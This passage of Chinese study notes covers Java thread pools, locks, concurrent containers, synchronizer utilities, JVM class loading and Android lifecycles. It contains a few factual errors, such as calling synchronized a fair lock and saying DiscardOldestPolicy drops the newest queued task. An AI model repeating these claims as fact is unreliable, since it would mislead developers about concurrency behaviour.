}  
```

### 线程池

```
public ThreadPoolExecutor(int corePoolSize,
 	int maximumPoolSize,
 	long keepAliveTime,
 	TimeUnit unit,
 	BlockingQueue<Runnable> workQueue,
 	ThreadFactory threadFactory,
 	RejectedExecutionHandler handler) 
```

##### ThreadPoolExecutor参数含义

**1. corePoolSize**

线程池中的核心线程数，默认情况下，核心线程一直存活在线程池中，即便他们在线程池中处于闲置状态。除非我们将ThreadPoolExecutor的allowCoreThreadTimeOut属性设为true的时候，这时候处于闲置的核心线程在等待新任务到来时会有超时策略，这个超时时间由keepAliveTime来指定。一旦超过所设置的超时时间，闲置的核心线程就会被终止。

**2. maximumPoolSize**

线程池中所容纳的最大线程数，如果活动的线程达到这个数值以后，后续的新任务将会被阻塞。包含核心线程数+非核心线程数。

**3. keepAliveTime**

非核心线程闲置时的超时时长，对于非核心线程，闲置时间超过这个时间，非核心线程就会被回收。只有对ThreadPoolExecutor的allowCoreThreadTimeOut属性设为true的时候，这个超时时间才会对核心线程产生效果。

**4. unit**

用于指定keepAliveTime参数的时间单位。他是一个枚举，可以使用的单位有天（TimeUnit.DAYS），小时（TimeUnit.HOURS），分钟（TimeUnit.MINUTES），毫秒(TimeUnit.MILLISECONDS)，微秒(TimeUnit.MICROSECONDS, 千分之一毫秒)和毫微秒(TimeUnit.NANOSECONDS, 千分之一微秒);

**5. workQueue**

线程池中保存等待执行的任务的阻塞队列。通过线程池中的execute方法提交的Runable对象都会存储在该队列中。我们可以选择下面几个阻塞队列。

| 阻塞队列                  | 说明                                       |
| --------------------- | ---------------------------------------- |
| ArrayBlockingQueue    | 基于数组实现的有界的阻塞队列,该队列按照FIFO（先进先出）原则对队列中的元素进行排序。 |
| LinkedBlockingQueue   | 基于链表实现的阻塞队列，该队列按照FIFO（先进先出）原则对队列中的元素进行排序。 |
| SynchronousQueue      | 内部没有任何容量的阻塞队列。在它内部没有任何的缓存空间。对于SynchronousQueue中的数据元素只有当我们试着取走的时候才可能存在。 |
| PriorityBlockingQueue | 具有优先级的无限阻塞队列。                            |

我们还能够通过实现BlockingQueue接口来自定义我们所需要的阻塞队列。

**6. threadFactory**

线程工厂，为线程池提供新线程的创建。ThreadFactory是一个接口，里面只有一个newThread方法。 默认为DefaultThreadFactory类。

**7. handler**

是RejectedExecutionHandler对象，而RejectedExecutionHandler是一个接口，里面只有一个rejectedExecution方法。**当任务队列已满并且线程池中的活动线程已经达到所限定的最大值或者是无法成功执行任务，这时候ThreadPoolExecutor会调用RejectedExecutionHandler中的rejectedExecution方法。在ThreadPoolExecutor中有四个内部类实现了RejectedExecutionHandler接口。在线程池中它默认是AbortPolicy，在无法处理新任务时抛出RejectedExecutionException异常**。

下面是在ThreadPoolExecutor中提供的四个可选值。

| 可选值                 | 说明                                |
| ------------------- | --------------------------------- |
| CallerRunsPolicy    | 只用调用者所在线程来运行任务。                   |
| AbortPolicy         | 直接抛出RejectedExecutionException异常。 |
| DiscardPolicy       | 丢弃掉该任务，不进行处理。                     |
| DiscardOldestPolicy | 丢弃队列里最近的一个任务，并执行当前任务。             |

我们也可以通过实现RejectedExecutionHandler接口来自定义我们自己的handler。如记录日志或持久化不能处理的任务。

**execute** ：

直接传入一个Runnable

```java
service.execute(new Runnable() {
	public void run() {
		System.out.println("execute方式");
	}
});
```

**submit**

当我们使用submit来提交任务时,它会返回一个future,我们就可以通过这个future来判断任务是否执行成功，还可以通过future的get方法来获取返回值。如果子线程任务没有完成，get方法会阻塞住直到任务完成，而使用get(long timeout, TimeUnit unit)方法则会阻塞一段时间后立即返回，这时候有可能任务并没有执行完。

```java
Future<Integer> future = service.submit(new Callable<Integer>() {

	@Override
	public Integer call() throws Exception {
		System.out.println("submit方式");
		return 2;
	}
});
try {
	Integer number = future.get();
} catch (ExecutionException e) {
				// TODO Auto-generated catch block
	e.printStackTrace();
}
```

##### 线程池关闭

调用线程池的`shutdown()`或`shutdownNow()`方法来关闭线程池

shutdown原理：将线程池状态设置成SHUTDOWN状态，然后中断所有没有正在执行任务的线程。

shutdownNow原理：将线程池的状态设置成STOP状态，然后中断所有任务(包括正在执行的)的线程，并返回等待执行任务的列表。

![img](https://camo.githubusercontent.com/b84bf3f22d9a96e43f24cde542b9586afeb26d4f/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d633035373731393832616432376638362e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

①如果在线程池中的线程数量没有达到核心的线程数量，这时候就回启动一个核心线程来执行任务。

②如果线程池中的线程数量已经超过核心线程数，这时候任务就会被插入到任务队列中排队等待执行。

③由于任务队列已满，无法将任务插入到任务队列中。这个时候如果线程池中的线程数量没有达到线程池所设定的最大值，那么这时候就会立即启动一个非核心线程来执行任务。

④如果线程池中的数量达到了所规定的最大值，那么就会拒绝执行此任务，这时候就会调用RejectedExecutionHandler中的rejectedExecution方法来通知调用者。



**队列一般而言只针对核心线程数**





四种线程池类：

##### 1.newFixedThreadPool  核心线程数固定，且只有核心线程，底层是一个LinkedBlockingQueue,无大小限制，不能存在超时机制，队列也没有大小限制。

**2.newCachedThreadPool**  **核心线程数为0，**线程池的最大线程数Integer.MAX_VALUE。 内部是SynchronousQueue，是一个没有容量的阻塞队列，无法插入，所以有线程任务无法处理就创建新线程，超时后回收

**3.newScheduledThreadPool** 它的核心线程数是固定的，对于非核心线程几乎可以说是没有限制的，并且当非核心线程处于限制状态的时候就会立即被回收。

##### 4.newSingleThreadExecutor ，**在这个线程池中只有一个核心线程**，对于任务队列没有大小限制，也就意味着**这一个任务处于活动状态时，其他任务都会在任务队列中排队等候依次执行**。

线程池个数：

| 任务类别     | 说明                                       |
| -------- | ---------------------------------------- |
| CPU密集型任务 | 线程池中线程个数应尽量少，如配置N+1个线程的线程池。              |
| IO密集型任务  | 由于IO操作速度远低于CPU速度，那么在运行这类任务时，CPU绝大多数时间处于空闲状态，那么线程池可以配置尽量多些的线程，以提高CPU利用率，如2*N。 |
| 混合型任务    | 可以拆分为CPU密集型任务和IO密集型任务，当这两类任务执行时间相差无几时，通过拆分再执行的吞吐率高于串行执行的吞吐率，但若这两类任务执行时间有数据级的差距，那么没有拆分的意义。 |

### 死锁

1. 互斥条件：一个资源每次只能被一个线程使用。
2. 请求与保持条件：一个线程因请求资源而阻塞时，对已获得的资源保持不放。
3. 不剥夺条件：线程已获得的资源，在未使用完之前，不能强行剥夺。
4. 循环等待条件：若干线程之间形成一种头尾相接的循环等待资源关系。

静态的锁顺序死锁，动态的锁顺序死锁，协作对象之间发生的死锁。

1.**解决静态的锁顺序死锁的方法就是：所有需要多个锁的线程，都要以相同的顺序来获得锁。**

```
class StaticLockOrderDeadLock {
    private final Object lockA = new Object();
    private final Object lockB = new Object();

    public void a() {
        synchronized (lockA) {
            synchronized (lockB) {
                System.out.println("function a");
            }
        }
    }

    public void b() {
        synchronized (lockB) {
            synchronized (lockA) {
                System.out.println("function b");
            }
        }
    }
}
```



**2.动态的锁顺序死锁**‘

锁对象是从参数传进来的，具体导致原因同上。

**System.identifyHashCode** 可以通过hashcode来固定顺序

**3.协作对象之间发生的死锁：**

在协作对象之间发生的死锁更加隐蔽。例如多个线程安全的synchronized()方法，在使用时出现相互调用的情况，一旦调用的顺序出现循环，那极有可能导致死锁。避免这种死锁的最简单方法就是尽可能的用synchronized代码块取代synchronized方法，使方法尽可能的变成开放调用。

4,资源死锁

一致顺序，开放调用

###线程安全的理论

#### 线程安全的内存模型

当一个线程需要修改共享变量的值。完成这个操作，先取出共享变量的值赋给A，然后基于A的基础进行计算，得到新值B，完了需要更新共享变量的值了，这个时候就可以调用CAS方法更新变量值了。

####线程安全的三个特性

原子性，可见性，有序性

```
如果把一个事务可看作是一个程序,它要么完整的被执行,要么完全不执行。这种特性就叫原子性
```



###java中的并发锁及理解

###公平锁 非公平锁  悲观锁  乐观锁

公平锁（Fair  synchronized）：加锁前检查是否有排队等待的线程，优先排队等待的线程，先来先得
非公平锁（Nonfair **ReentrantLock **）：加锁时不考虑排队等待问题，直接尝试获取锁，获取不到自动到队尾等待

**ReenTrantLock可以指定是公平锁还是非公平锁**

**基于AQS的锁(比如ReentrantLock)原理大体是这样:**
**有一个state变量，初始值为0，假设当前线程为A,每当A获取一次锁，status++. 释放一次，status--.锁会记录当前持有的线程。**
**当A线程拥有锁的时候，status>0. B线程尝试获取锁的时候会对这个status有一个CAS(0,1)的操作，尝试几次失败后就挂起线程，进入一个等待队列。**
**如果A线程恰好释放，--status==0, A线程会去唤醒等待队列中第一个线程，即刚刚进入等待队列的B线程，B线程被唤醒之后回去检查这个status的值，尝试CAS(0,1),而如果这时恰好C线程也尝试去争抢这把锁非公平锁实现：C直接尝试对这个status CAS(0,1)操作，并成功改变了status的值，B线程获取锁失败，再次挂起，这就是非公平锁，B在C之前尝试获取锁，而最终是C抢到了锁。公平锁：C发现有线程在等待队列，直接将自己进入等待队列并挂起,B获取锁**

**Java中的ReentrantLock 默认的lock（）方法采用的是非公平锁**



　悲观锁：总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。再比如Java里面的同步原语synchronized关键字的实现也是悲观锁。

　　乐观锁：顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号等机制。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库提供的类似于write_condition机制，其实都是提供的乐观锁。在Java中java.util.concurrent.atomic包下面的原子变量类就是使用了乐观锁的一种实现方式CAS实现的。









### 类锁，方法锁，重入锁的理解

重入锁： 所谓重入锁，指的是以线程为单位，当一个线程获取对象锁之后，这个线程可以再次获取本对象上的锁，而其他的线程是不可以的

每个锁关联一个请求计数和一个占有它的线程；每重入一次，计数器加1，释放时减1

# ReentrantLock的可重入性分析

这里有一篇对锁介绍甚为详细的文章 [朱小厮的博客-Java中的锁](http://blog.csdn.net/u013256816/article/details/51204385).

## synchronized的可重入性

参考这篇文章： [Java内置锁synchronized的可重入性](http://blog.csdn.net/aigoogle/article/details/29893667)。

### 两个锁的比较

1.synchronzed 内部有异常解锁机制；Lock需要手动解锁

2.Synchronzed 简单；Lock支持更多的操作，lock的超时时间，lock的中断，lock配置公平锁等

3.synchronzed 在资源竞争不激烈时效率高，lock在竞争激烈时效率高。 

### volatile关键字

### 线程安全容器

**同步容器**：

同步容器可以简单地理解为通过synchronized来实现同步的容器，如果有多个线程调用同步容器的方法，它们将会串行执行。

同步容器在**多线程**环境下的复合操作（迭代、条件运算如没有则添加等）是**非线程安全**，需要客户端代码来实现加锁。

**并发容器**：

在jdk5.0引入了concurrent包，其中提供了很多并发容器，极大的提升同步容器类的性能。

**concurrentHashMap**

分段锁，segment集成lock，有一个segment的数组

，有**copyOnWriteArrayList**

利用高并发往往是读多写少的特性，对读操作不加锁，对写操作，先复制一份新的集合，在新的集合上面修改，然后将新集合赋值给旧的引用，并通过volatile 保证其可见性，当然写操作的锁是必不可少的了。

可以发现在添加的时候是需要加锁的，否则多线程写的时候会Copy出N个副本出来。

**copyOnWriteArraySet**

唯一不同是add时调用addlfAbsent，如果有，则直接返回



阻塞队列与非阻塞队列： 如果满了就失败认为是非阻塞，满了就等待是阻塞队列

有界/无界队列 ： 队列有没有大小限制



**concurrentLinkedQueue**

非阻塞队列，无界。

当我们添加一个元素的时候，它会添加到队列的尾部，当我们获取一个元素时，它会返回队列头部的元素。

![img](http://ifeve.com/wp-content/uploads/2013/01/ConcurrentLinekedQueue%E9%98%9F%E5%88%97%E5%85%A5%E9%98%9F%E7%BB%93%E6%9E%84%E5%8F%98%E5%8C%96%E5%9B%BE.jpg)

发现入队主要做两件事情，第一是将入队节点设置成当前队列尾节点的下一个节点。第二是更新tail节点，如果tail节点的next节点不为空，则将入队节点设置成tail节点，如果tail节点的next节点为空，则将入队节点设置成tail的next节点，所以tail节点不总是尾节点，理解这一点对于我们研究源码会非常有帮助。

它是一个基于链表的无界线程安全队列，它采用先入先出的规则对节点进行排序，当我们添加一个节点的时候，它会添加到队列的尾部；当我们获取一个元素的时，它会返回队列头部的元素。它通过使用head和tail引用延迟更改的方式，减少CAS操作，在满足线程安全的前提下，提高了队列的操作效率。



**LinkedBlockingQueue**

一个put锁，一个get锁，可以提高效率；无界性。

**ArrayBlockingQueue**

循环队列，保存一个putindex，最新进来的往后放，循环到头。在put时，配合使用了lock和Condition来处理队列满的情况。   只有一个锁，**一个线程共用一个锁**。



**PriorityBlockingQueue**

数组和二叉堆排序优先级



condition 配合Lock使用

```java
    Lock lock = new ReentrantLock();
    Condition condition = lock.newCondition();

    public void conditionWait() throws InterruptedException {
        lock.lock();
        try {
            //....
            condition.await();
        }finally {
            lock.unlock();
        }
    }

    public void conditionSignal(){
        lock.lock();
        try {
            //...
            condition.signal();
        }finally {
            lock.unlock();
        }
    }
```





### CAS

CAS操作有3个操作数，内存值M，预期值E，新值U，如果M==E，则将内存值修改为U，否则啥都不做。

AQS？



### 手写生产者消费者 三种方式

主要考虑的是阻塞问题和并发问题

1.wait/notify

正确做法：生产者和消费者继承thread，run方法中进行消费，构造函数传入队列和大小
    import java.util.LinkedList;

    public class Storage
    
    {
    // 仓库最大存储量
    private final int MAX_SIZE = 100;
    
    // 仓库存储的载体
    private LinkedList<Object> list = new LinkedList<Object>();
    
    // 生产产品
    public void produce(String producer)
    {
        synchronized (list)
        {
            // 如果仓库已满
            while (list.size() == MAX_SIZE)
            {
                System.out.println("仓库已满，【"+producer+"】： 暂时不能执行生产任务!");
                try
                {
                    // 由于条件不满足，生产阻塞
                    list.wait();
                }
                catch (InterruptedException e)
                {
                    e.printStackTrace();
                }
            }
    
            // 生产产品            
            list.add(new Object());            
    
            System.out.println("【"+producer+"】：生产了一个产品\t【现仓储量为】:" + list.size());
    
            list.notifyAll();
        }
    }
    
    // 消费产品
    public void consume(String consumer)
    {
        synchronized (list)
        {
            //如果仓库存储量不足
            while (list.size()==0)
            {
                System.out.println("仓库已空，【"+consumer+"】： 暂时不能执行消费任务!");
                try
                {
                    // 由于条件不满足，消费阻塞
                    list.wait();
                }
                catch (InterruptedException e)
                {
                    e.printStackTrace();
                }
            }
            
            list.remove();
            System.out.println("【"+consumer+"】：消费了一个产品\t【现仓储量为】:" + list.size());
            list.notifyAll();
        }
    }
    
    public LinkedList<Object> getList()
    {
        return list;
    }
    
    public void setList(LinkedList<Object> list)
    {
        this.list = list;
    }
    
    public int getMAX_SIZE()
    {
        return MAX_SIZE;
    }
}



2.await/signal

import java.util.LinkedList;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Storage {
    // 仓库最大存储量
    private final int MAX_SIZE = 100;
    
    // 仓库存储的载体
    private LinkedList<Object> list = new LinkedList<Object>();
    // 锁
    private final Lock lock = new ReentrantLock();
    
    // 仓库满的条件变量
    private final Condition full = lock.newCondition();
    
    // 仓库空的条件变量
    private final Condition empty = lock.newCondition();
    
    // 生产产品
    public void produce(String producer) {
        lock.lock();
        // 如果仓库已满
        while (list.size() == MAX_SIZE) {
            System.out.println("仓库已满，【" + producer + "】： 暂时不能执行生产任务!");
            try {
                // 由于条件不满足，生产阻塞
                full.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    
        // 生产产品
        list.add(new Object());
    
        System.out.println("【" + producer + "】：生产了一个产品\t【现仓储量为】:" + list.size());
    
        empty.signalAll();
    
        // 释放锁
        lock.unlock();
    
    }
    
    // 消费产品
    public void consume(String consumer) {
        // 获得锁
        lock.lock();
    
        // 如果仓库存储量不足
        while (list.size() == 0) {
            System.out.println("仓库已空，【" + consumer + "】： 暂时不能执行消费任务!");
            try {
                // 由于条件不满足，消费阻塞
                empty.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    
        list.remove();
        System.out.println("【" + consumer + "】：消费了一个产品\t【现仓储量为】:" + list.size());
        full.signalAll();
        
        // 释放锁
        lock.unlock();
    
    }
    
    public LinkedList<Object> getList() {
        return list;
    }
    
    public void setList(LinkedList<Object> list) {
        this.list = list;
    }
    
    public int getMAX_SIZE() {
        return MAX_SIZE;
    }
}





3.BlockingQueue

put和take

import java.util.concurrent.LinkedBlockingQueue;

public class Storage {
```java
// 仓库最大存储量
private final int MAX_SIZE = 100;

// 仓库存储的载体
private LinkedBlockingQueue<Object> list = new LinkedBlockingQueue<Object>(100);  

// 生产产品
public void produce(String producer) {
    // 如果仓库已满
    if (list.size() == MAX_SIZE) {
        System.out.println("仓库已满，【" + producer + "】： 暂时不能执行生产任务!");            
    }

    // 生产产品
    try {
        list.put(new Object());
    } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    System.out.println("【" + producer + "】：生产了一个产品\t【现仓储量为】:" + list.size());
}

// 消费产品
public void consume(String consumer) {
    // 如果仓库存储量不足
    if (list.size() == 0) {
        System.out.println("仓库已空，【" + consumer + "】： 暂时不能执行消费任务!");            
    }

    try {
        list.take();
    } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    System.out.println("【" + consumer + "】：消费了一个产品\t【现仓储量为】:" + list.size());        

}

public LinkedBlockingQueue<Object> getList() {
    return list;
}

public void setList(LinkedBlockingQueue<Object> list) {
    this.list = list;
}
public int getMAX_SIZE() {
    return MAX_SIZE;
}
```
}



### 同步的工具类

1.semaphore

控制方法并发线程数

2.FutureTask

有返回值的Runnable

3.countDownLatch 闭锁

类似于join，不过，比join的功能更丰富

```java
private static CountDownLatch countDown=new CountDownLatch(threadCount);//CountDownLatch  
 private static class Parser implements Runnable{   
        String name;  
        public Parser(String name){  
            this.name=name;  
        }  
        @Override  
        public void run() {  
            int sum=0;  
            int seed=Math.abs(sr.nextInt()) ;  
            Random r=new Random(47);   
            for(int i=0;i<100;i++){    
                sum+=r.nextInt(seed);  
            }    
            result.addAndGet(sum);  
            System.out.println(name+"线程的解析结果："+sum);  
            countDown.countDown();//注意这里  
        }   
    }  
    public static void main(String[] args) throws InterruptedException {  
        Thread[] threads=new Thread[threadCount];  
        for(int i=0;i<threadCount;i++){  
            threads[i]=new Thread(new Parser("Parser-"+i));  
        }   
        for(int i=0;i<threadCount;i++){  
            threads[i].start();  
        }   
        /* 
        for(int i=0;i<threadCount;i++){ 
            threads[i].join(); 
        }*/  
        countDown.await();//将join改为使用CountDownLatch  
        System.out.println("所有线程解析结束！");  
        System.out.println("所有线程的解析结果："+result);  
    }   
```

当我们调用CountDownLatch的countDown方法时，N就会减1，CountDownLatch的await方法会阻塞当前线程，直到N变成零。由于countDown方法可以用在任何地方，所以这里说的N个点，可以是N个线程，也可以是1个线程里的N个执行步骤。用在多个线程时，只需要把这个CountDownLatch的引用传递到线程里即可。

4.栅栏CyclicBarrier

设置屏障直到所有线程满足条件后所有被屏障拦截的线程才会继续运行

```java
import java.util.Random; 
import java.util.concurrent.CyclicBarrier;
import java.util.concurrent.atomic.AtomicInteger;


public class CyclicBarrierTest {

	private static Random sr=new Random(47); 
	private static AtomicInteger result=new AtomicInteger(0);
	private static int threadCount=10;
	//屏障后面执行汇总
	private static CyclicBarrier barrier=new CyclicBarrier(threadCount,new Accumulate());
	private static class Parser implements Runnable{ 
		String name;
		public Parser(String name){
			this.name=name;
		}
		@Override
		public void run() {
			int sum=0;
			int seed=Math.abs(sr.nextInt()) ;
			Random r=new Random(47); 
			for(int i=0;i<(seed%100*100000);i++){  
				sum+=r.nextInt(seed); 
			}  
			result.addAndGet(sum);
			System.out.println(System.currentTimeMillis()+"-"+name+"线程的解析结果："+sum);
			try { 
				barrier.await();
				System.out.println(System.currentTimeMillis()+"-"+name+"线程越过屏障！");
			} catch (Exception e) {
				e.printStackTrace();
			}
		} 
	}
	static class Accumulate implements Runnable{ 
		@Override
		public void run() { 
			System.out.println("所有线程解析结束！");
			System.out.println("所有线程的解析结果："+result);
		} 
	}
	public static void main(String[] args) throws InterruptedException {
		Thread[] threads=new Thread[threadCount];
		for(int i=0;i<threadCount;i++){
			threads[i]=new Thread(new Parser("Parser-"+i));
		} 
		for(int i=0;i<threadCount;i++){
			threads[i].start();
		}   
	} 
}
```

**CyclicBarrier和CountDownLatch的区别**

CountDownLatch的计数器只能使用一次，而CyclicBarrier的计数器可以使用reset()方法重置。所以CyclicBarrier能处理更为复杂的业务场景。例如，如果计算发生错误，可以重置计数器，并让线程重新执行一次。
CyclicBarrier还提供其他有用的方法，比如getNumberWaiting方法可以获得Cyclic-Barrier阻塞的线程数量。isBroken()方法用来了解阻塞的线程是否被中断。

5.**线程间交换数据的Exchanger**

Exchanger（交换者）是一个用于线程间协作的工具类。Exchanger用于进行线程间的数据交换。它提供一个同步点，在这个同步点，两个线程可以交换彼此的数据。这两个线程通过exchange方法交换数据，如果第一个线程先执行exchange()方法，它会一直等待第二个线程也执行exchange方法，当两个线程都到达同步点时，这两个线程就可以交换数据，将本线程生产出来的数据传递给对方。

```java
import java.util.concurrent.Exchanger;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ExchangerTest {

	private static final Exchanger<String> exgr = new Exchanger<String>();
	private static ExecutorService threadPool = Executors.newFixedThreadPool(2);

	public static void main(String[] args) {
		threadPool.execute(new Runnable() {
			@Override
			public void run() {
				try {
					String A = "银行流水100";// A录入银行流水数据
					String B=exgr.exchange(A);
					System.out.println("A的视角：A和B数据是否一致：" + A.equals(B) + 
"，A录入的是：" + A + "，B录入是：" + B);
				} catch (InterruptedException e) {
				}
			}
		});
		threadPool.execute(new Runnable() {
			@Override
			public void run() {
				try {
					String B = "银行流水200";// B录入银行流水数据
					String A = exgr.exchange(B);
					System.out.println("B的视角：A和B数据是否一致：" + A.equals(B) + 
"，A录入的是：" + A + "，B录入是：" + B);
				} catch (InterruptedException e) {
				}
			}
		});
		threadPool.shutdown();
	}
}
```



### 多线程安全与同步







## java虚拟机

###  



### 垃圾回收算法





### 类加载机制及类加载器

类加载在程序运行期间完成的好处：

1.可以实现多态

2.可以从网络或者磁盘加载



加载步骤：

加载-> **验证 ->准备 ->解析** ->初始化->使用->卸载 (黑体为连接状态)

解析可以在初始化前也可以在后，是为了支持后期绑定



通过子类调用父类的静态字段，不会触发子类的初始化只会触发父类的初始化



加载阶段：

- 类限定名查找到二进制字节流
- 将字节流的静态存储结构转换为方法取得运行时数据结构
- 在内存中生成类的class对象

验证阶段：

确保class文件字节流中存在信息符合当前虚拟机要求，不会危害虚拟机安全。

准备阶段：

为类变量分配内存并设置变量初始值

解析阶段：

将符号引用转换为直接饮用：



1.符号引用（Symbolic References）：

　　符号引用以一组符号来描述所引用的目标，符号可以是任何形式的字面量，只要使用时能够无歧义的定位到目标即可。例如，在Class文件中它以CONSTANT_Class_info、CONSTANT_Fieldref_info、CONSTANT_Methodref_info等类型的常量出现。符号引用与虚拟机的内存布局无关，引用的目标并不一定加载到内存中。在[Java](http://lib.csdn.net/base/javaee)中，一个java类将会编译成一个class文件。在编译时，java类并不知道所引用的类的实际地址，因此只能使用符号引用来代替。比如org.simple.People类引用了org.simple.Language类，在编译时People类并不知道Language类的实际内存地址，因此只能使用符号org.simple.Language（假设是这个，当然实际中是由类似于CONSTANT_Class_info的常量来表示的）来表示Language类的地址。各种虚拟机实现的内存布局可能有所不同，但是它们能接受的符号引用都是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。

2.直接引用：

 直接引用可以是

（1）直接指向目标的指针（比如，指向“类型”【Class对象】、类变量、类方法的直接引用可能是指向方法区的指针）

（2）相对偏移量（比如，指向实例变量、实例方法的直接引用都是偏移量）

（3）一个能间接定位到目标的句柄

直接引用是和虚拟机的布局相关的，同一个符号引用在不同的虚拟机实例上翻译出来的直接引用一般不会相同。如果有了直接引用，那引用的目标必定已经被加载入内存中了

**初始化：**

真正执行类的java代码:



类加载顺序：

#### **1、先加载静态成员/代码块**

先递归地加载父类的静态成员/代码块(Object的最先)；再依次加载到本类的静态成员。**同一个类里的静态成员/代码块，按写代码的顺序加载。** 如果其间调用静态方法，则调用时会先运行静态方法，再继续加载。同一个类里调用静态方法时，可以不理会写代码的顺序。

#### **2、然后加载非静态成员/代码块**

由于实例块在创建对象时才会被加载。而静态成员在不创建对象时可以加载，所以会先递归地加载父类的非静态成员/代码块(Object的最先)；再依次加载到本类的非静态成员。**同一个类里的非静态成员/代码块，按写代码的顺序加载。** 同一个类里调用方法时，可以不理会写代码的顺序。

#### **3、最后调用构造方法**

**先递归地调用父类的构造方法(Object的最先)也就是先父后子。** 默认调用父类空参的，也可在第一行写明调用父类某个带参的。再依次到本类的构造方法；构造方法内，也可在第一行写明调用某个本类其它的构造方法。



类加载器：

同一虚拟机下，对于同一calss文件，用不同的类加载器加载后得到的类不相同

启动类加载器<-拓展类加载器<-应用程序类加载器

类加载器之间的父子关系不是通过继承而是组合关系实现。

**双亲委派过程**：检查是否已经被记载，如果没有被记载就调用父加载器，父加载器为空就使用启动类加载器作为父加载器。如果父加载器加载失败抛出异常则再调用自己的类加载器。

**双亲委派模型的好处**：

防止内存中出现多份同样的字节码

- 如果不用委托而是自己加载自己的，那么类A就会加载一份System字节码，然后类B又会加载一份System字节码，**这样内存中就出现了两份System字节码。**
- 如果使用委托机制，会递归的向父类查找，也就是**首选用Bootstrap尝试加载**，如果找不到再向下。这里的System就能在Bootstrap中找到然后加载，如果此时类B也要加载System，也从Bootstrap开始，此时**Bootstrap发现已经加载过了System那么直接返回内存中的System即可而不需要重新加载**，这样内存中就只有一份System的字节码了。

能不能自己写个类叫`java.lang.System`？

**答案：**通常不可以，但可以采取另类方法达到这个需求。 
**解释：**为了不让我们写System类，类加载采用委托机制，这样可以保证爸爸们优先，爸爸们能找到的类，儿子就没有机会加载。而System类是Bootstrap加载器加载的，就算自己重写，也总是使用Java系统提供的System，**自己写的System类根本没有机会得到加载。**

但是，我们可以**自己定义一个类加载器来达到这个目的**，为了避免双亲委托机制，这个类加载器也必须是特殊的。由于系统自带的三个类加载器都加载特定目录下的类，如果我们自己的类加载器放在一个特殊的目录，那么系统的加载器就无法加载，也就是最终还是由我们自己的加载器加载。

## Android

### 生命周期及启动模式

**onPause中不能进行耗时操作，会影响到新Activity的显示。因为onPause必须执行完，新的Activity的onResume才会执行。**

A-----onPause()

B-----onCreate()

B-----onStart()

B-----onResume()

A-----onStop()



B-----onPause()

A-----onRestart()

A-----onStart()

A-----onResume()

B-----onStope

B-----onDestroy()



如果是当前Activity弹出的dialog则不会执行Activity任何生命周期中的方法,只有拦住了当前的Activity才会执行



不设置Activity的android:configChanges时，切换会重新调用各个生命周期，测试结果来看只执行一次

设置Activity的android:configChanges=“orientation”时，切屏时会重新调用各个生命周期，切横屏时执行一次，再切回竖屏时执行一次。

设置Activity的android:congifChanges="orentation|keyboardHidden"时，切屏时不会调用生命周期，只会执行onConfigurationChanged方法

打开新Activity

![img](https://upload-images.jianshu.io/upload_images/2915863-f0ecc4e261cacff8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

返回原activity

![img](https://upload-images.jianshu.io/upload_images/2915863-6b0d29926621ca9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



**onCreate和onRestoreInstanceState方法来恢复Activity的状态的区别：** onRestoreInstanceState回调则表明其中Bundle对象非空，不用加非空判断。onCreate需要非空判断。建议使用onRestoreInstanceState。



Fragment生命周期

1.Activity--onCreate();

2.Fragment--onAttach();

3.Fragment--onCreate();

4.Fragment--onCreateView();

5.Fragment--onActivityCreated();

 

接着是这样的：

6.Activity--onStart();

7.Fragment--onStart();

8.Activity--onResume();

9.Fragment--onResume();

我们知道，无论对于Activity还是对于Fragment，onResume这个生命周期都是他们执行时间最长的，当我们的Activity或者Fragment打开之后，它就一直处于这个生命周期中。

当销毁的时候，春江水暖鸭先知，当然是Fragment先感知到，于是销毁的时候就是Fragment带领Activity：

10.Fragment--onPause();

11.Activity--onPause();

12.Fragment--onStop();

13.Activity--onStop();

14.Fragment--onDestroyView();

15.Fragment--onDestroy();

16.Fragment--onDetach();

17.Activity--onDestroy();



通信：

1.直接public方法调用

2.接口方式调用

3.广播





启动模式：

**标准模式（standard）**

**栈顶复用模式（singleTop）**

​	通知栏点击新闻等，webview复用

**栈内复用模式（singleTask）**

​	大多数App的主页。对于大部分应用，当我们在主界面点击回退按钮的时候都是退出应用，那么当我们第一次进入主界面之后，主界面位于栈底，以后不管我们打开了多少个Activity，只要我们再次回到主界面，都应该使用将主界面Activity上所有的Activity移除的方式来让主界面Activity处于栈顶，而不是往栈顶新加一个主界面Activity的实例，通过这种方式能够保证退出应用时所有的Activity都能报销毁。

**单例模式（singleInstance）**

​	直接创建一个新的任务栈，并创建该Activity实例放入新栈中。一旦该模式的Activity实例已经存在于某个栈中，任何应用再激活该Activity时都会重用该栈中的实例。栈中只有他一个activity实例

​	叫来电界面。这种模式的使用情况比较罕见，在Launcher中可能使用。或者你确定你需要使Activity只有一个实例。建议谨慎使用。



在Android 5.0之前新创建的Activity会位于调用者的Task中，5.0及以后会放入新的Task中。

singleTask和taskAffinity配合使用，指定开启的Activity加入到哪个栈中。



**FLAG_ACTIVITY_NEW_TASK**

 其效果与指定Activity为singleTask模式一致。

**FLAG_ACTIVITY_SINGLE_TOP**

 其效果与指定Activity为singleTop模式一致

**FLAG_ACTIVITY_CLEAR_TOP** 

具有此标记位的Activity，当它启动时，在同一个任务栈中所有位于它上面的Activity都要出栈。

